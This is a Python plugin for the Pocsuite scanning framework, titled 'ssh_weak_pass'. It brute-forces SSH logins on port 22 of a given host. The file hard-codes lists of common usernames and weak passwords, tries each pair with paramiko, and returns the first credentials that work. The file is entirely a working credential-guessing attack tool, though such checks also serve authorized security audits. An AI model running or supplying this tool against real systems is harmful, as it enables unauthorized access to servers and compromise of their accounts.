import paramiko
import logging
from pocsuite.api.utils import getWeakPassword
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
logging.raiseExceptions = False
def checkSSH(host, port, user, pwd):
    res=[]
    try:
        ssh.connect(host, port, user, pwd)
        # print host + ' ' + port + ' ' + user + ' ' + pwd + ' LoginOK'
        res.append(user)
        res.append(pwd)
        return res
    except Exception as e:
        return False

def poc(url):
    ip = url.strip(" ")
    if ip.startswith("http://"):
        ip = ip.strip("http://")
    if ip.endswith("/"):
        ip = ip.strip("/")
    username_list=["root","admin","cisco","gnats","ftpusr","info","guest","mysql","jack","james","jeff","jabber","mike","michael","pi","raspberry","pop","oracle","tester","osmc","tester","library","admurbr","redhat","webadmin","user","new","www","ajay","mukesh","git","vijay","user2","root1"]
    # password_list=getWeakPassword()
    password_list=["root","123456","cisco123","admin","Admin","Admin123","toor","system","system123","System","System123","Admin123!@#","root123!@#"]
    res=False
    for i in range(0,len(username_list)):
        for j in range(0,len(password_list)):
            res=checkSSH(ip,"22",username_list[i],password_list[j])
            if res != False:
                break
        if res != False:
            break
    return res

class TestPOC(POCBase):
    name = 'ssh_weak_pass'
    vulID = 'SSV-89688'  # https://www.seebug.org/vuldb/ssvid-89688
    author = ['sxd']
    vulType = 'weak-pass'  # ssh弱口令
    version = '1.0'  # default version: 1.0
    references = [
        'https://www.cnblogs.com/k8gege/p/10991264.html']
    desc = '''
		   SSH 默认没有限制连接次数，可以加载字典文件进行密码猜解。
		   '''
    vulDate = '2020-03-2'
    createDate = '2020-03-2'
    updateDate = '2020-03-2'
    appName = 'ssh'
    appVersion = 'all'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        response = poc(self.url)
        if response != False:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + ' ssh_weak_pass' + ' is exist!'
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = response[0]
            result['AdminInfo']['Password'] = response[1]
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)